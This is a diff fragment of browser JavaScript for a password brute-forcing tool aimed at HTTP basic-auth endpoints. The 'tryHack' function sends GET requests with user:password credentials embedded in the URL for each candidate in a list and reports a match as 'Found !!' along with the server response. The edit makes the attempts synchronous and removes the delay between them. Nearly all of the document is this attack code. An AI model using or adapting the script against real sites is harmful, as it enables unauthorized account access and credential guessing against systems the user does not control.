@@ -145,8 +145,8 @@
         var user = document.getElementById("user").value;
         for (var k in passStatus){
             if (!found){
-                tryHack(k, user);
-                await sleep(100);
+                await tryHack(k, user);
+                
             }
         }
     }
@@ -159,7 +159,6 @@
         var url = document.getElementById("url").value;
         var a = document.createElement("a");
         a.href = url;
-
         var req = new XMLHttpRequest();
 
         req.onload = function (e) {
@@ -169,6 +168,7 @@
                     passStatus[pass] = " <b style='color:green;'>Found !!<b>";
                     document.getElementById("found").innerHTML = pass+ " <b style='color:green;'>Found !!</b><br>"+ req.responseText;
                     found = true;
+                    current_number++;
                     updatePasswordDom();
                 } else {
                     console.error(req.statusText);
@@ -179,8 +179,8 @@
                 }
             }
         }
-        req.open("get", a.protocol + "//" + user + ":" + pass + "@" + a.hostname + a.pathname, true);
-        req.send();
+        req.open("get", a.protocol + "//" + user + ":" + pass + "@" + a.hostname + a.pathname, false);
+        await req.send();
     }
 
 </script>
